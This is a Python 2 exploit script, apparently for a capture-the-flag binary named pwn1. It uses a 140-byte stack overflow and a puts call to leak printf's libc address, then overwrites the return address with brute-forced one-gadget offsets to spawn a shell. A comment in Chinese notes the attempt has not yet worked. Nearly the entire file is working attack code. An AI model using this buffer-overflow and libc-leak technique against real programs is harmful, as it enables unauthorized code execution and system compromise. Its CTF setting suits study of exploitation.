# coding:utf-8
# 测试32位magic system， 未成功

from zio import *
from pwn import *

def pwn_it(magic_offset):
	io = zio('./pwn1', timeout = 999999999, print_read = COLORED(RAW, 'green'), print_write = COLORED(RAW, 'blue')) 

	e = elf.ELF('./pwn1')

	ret = 0x8048436
	popret = 0x804844d
	pop2ret = 0x80487ad
	pop3ret = 0x804882d
	pop4ret = 0x804882c
	leaveret = 0x8048568
	addesp_12 = 0x804844a
	addesp_44 = 0x8048829
	addesp_156 = 0x80487a7

	_s = 0x0804888F
	_d = 0x080488F4

	main_addr = 0x080485FD

	buf = 'A'*140 + p32(e.plt['puts']) + p32(main_addr) + p32(e.got['printf']) + p32(0)

	io.read_until('name:')
	io.writeline(buf)

	#io.gdb_hint(breakpoints = [0x08048789])

	io.read_until(':')
	io.writeline('1')

	buf = io.read_until('Welcome')
	printf_addr = u32(buf.split('\n')[1][:4])

	print '[*]printf addr: ', hex(printf_addr)

	libc = elf.ELF('libc.so.6')
	libc_base = printf_addr - libc.symbols['printf']

	#magic_sh = 0x00064BE1 + libc_base
	#magic_sh =  0x003E19B + libc_base
	magic_sh = magic_offset + libc_base

	print '[*]magic addr: ', hex(magic_sh)

	io.read_until('name:')

	buf = 'A'*140 + p32(magic_sh)

	io.writeline(buf)
	io.read_until(':')
	io.writeline('1')


	io.interact()

if __name__ == '__main__':
	#for addr in range(0x003E19B, 0x0003E248):
	#for addr in range(0x00064BD1, 0x00064BFB):
	for addr in range(0x00123AE0, 0x00123B0D):
		print "[*] test:", hex(addr)
		try:
			pwn_it(addr)
		except Exception, e:
			print e




